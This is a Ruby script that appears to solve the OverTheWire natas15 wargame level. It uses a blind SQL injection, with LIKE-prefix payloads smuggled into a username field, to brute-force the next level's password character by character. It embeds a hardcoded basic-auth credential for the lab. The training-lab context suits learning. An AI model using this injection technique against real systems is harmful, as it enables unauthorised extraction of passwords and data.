require 'rubygems'
require 'httparty'

def print_new(c)
  print c
end

def print_replacement(c)
  print "\b#{c}"
end

def query(username)
  url = 'http://natas15.natas.labs.overthewire.org/'
  auth = { :username => 'natas15', :password => 'm2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV' }
  query = { :debug => true, :username => username }

  response = HTTParty.get(url, :query => query, :basic_auth => auth)
  /This user exists/.match(response.body)
end

def partial(try)
  try if query("natas16\" AND BINARY password LIKE \"#{try}%")
end

def full(try)
  try if query("natas16\" AND BINARY password=\"#{try}")
end

def try_all(start)
  valid_characters = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
  found = nil
  print_new '?'
  valid_characters.each do | c |
    print_replacement c
    try = start + c
    if partial(try)
      found = try 
      break
    end
  end

  if found
    if full(found)
      puts "GOT IT - #{found}"
      exit
    end
  end

  found
end

def find
  current = ""
  loop do
    current = try_all(current)
  end
end
